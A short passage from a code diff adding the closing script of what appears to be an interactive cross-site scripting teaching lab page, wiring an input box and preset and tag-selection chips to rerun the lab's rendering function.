+      res.append(verdict, p);
+    }
+  }
+  input.addEventListener('input', runLab);
+  $('xss-presets').addEventListener('click', (e) => {
+    const b = e.target.closest('.chip'); if (!b) return;
+    input.value = b.dataset.v; runLab();
+  });
+  $('xss-tags').addEventListener('click', (e) => {
+    const b = e.target.closest('.chip'); if (!b) return;
+    mode = b.dataset.tag;
+    [...e.currentTarget.children].forEach(c => c.classList.toggle('on', c === b));
+    runLab();
+  });
+  runLab();
+}
+</script>
+</body>
+</html>
